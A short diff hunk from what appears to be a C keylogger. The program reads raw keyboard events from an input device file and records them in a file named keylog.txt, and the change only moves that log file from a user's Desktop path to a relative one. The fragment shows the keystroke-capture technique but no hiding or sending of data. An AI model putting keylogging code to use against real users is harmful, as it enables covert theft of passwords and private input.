@@ -25,7 +25,7 @@ int main()
     struct input_event ie;
     uint16_t code, type;
     int16_t value;
-    FILE* log_file = fopen("/home/kindane/Desktop/keylog.txt", "w");
+    FILE* log_file = fopen("keylog.txt", "w");
 
     if((file = fopen(KEYBOARDFILE, "rb")) == NULL) {
         perror("Reading keyboard file error");
